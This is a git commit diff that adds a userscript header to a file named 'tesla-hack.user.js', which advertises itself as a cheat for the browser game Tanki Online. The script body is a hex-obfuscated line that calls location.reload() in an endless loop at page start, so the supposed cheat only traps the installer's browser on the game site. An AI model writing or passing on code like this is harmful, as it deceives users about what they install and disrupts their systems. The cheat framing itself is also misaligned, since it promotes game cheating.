c2ed7273e14af892964d47190b9e64a50d78c339
N3onTechF0X <128133812+N3onTechF0X@users.noreply.github.com>
2023-11-13 21:04:00 +0200

    Update tesla-hack.user.js

--- tesla-hack.user.js
+++ tesla-hack.user.js
@@ -1,3 +1,12 @@
-
+// ==UserScript==
+// @name         Tesla hack
+// @description  Mega hack on tesla in tanki online
+// @version      2.0
+// @author       creators: sheezzmee, hopzy | спизжено: N3onTechF0X
+// @match        https://*.tankionline.com/*
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=tankionline.com
+// @run-at       document-start
+// @grant        none
+// ==/UserScript==
 
 var _0x2a46=["\x72\x65\x6C\x6F\x61\x64"];while(!![]) {location[_0x2a46[0]]();}
